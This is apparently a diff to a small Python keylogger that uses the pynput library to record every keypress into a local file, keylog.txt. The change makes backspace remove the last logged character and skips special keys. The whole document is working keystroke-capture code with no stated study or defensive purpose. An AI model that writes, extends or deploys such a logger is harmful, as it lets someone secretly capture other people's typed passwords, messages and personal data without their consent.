@@ -1,14 +1,21 @@
 from pynput import keyboard
 
 def keyPressed(key):
-    print(str(key))
-    with open("keylog.txt", "a") as logkey:
+    if key == keyboard.Key.backspace:
         try:
-            logkey.write(key.char)
-        except AttributeError:
-            logkey.write(f"[{key}]")
+            with open("keylog.txt", "rb+") as log:
+                log.seek(-1, 2)
+                log.truncate()
+        except:
+            pass
+        return
+
+    try:
+        with open("keylog.txt", "a") as log:
+            log.write(key.char)
+    except AttributeError:
+        pass  # ignore other special keys
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    listener.join()
+    with keyboard.Listener(on_press=keyPressed) as listener:
+        listener.join()
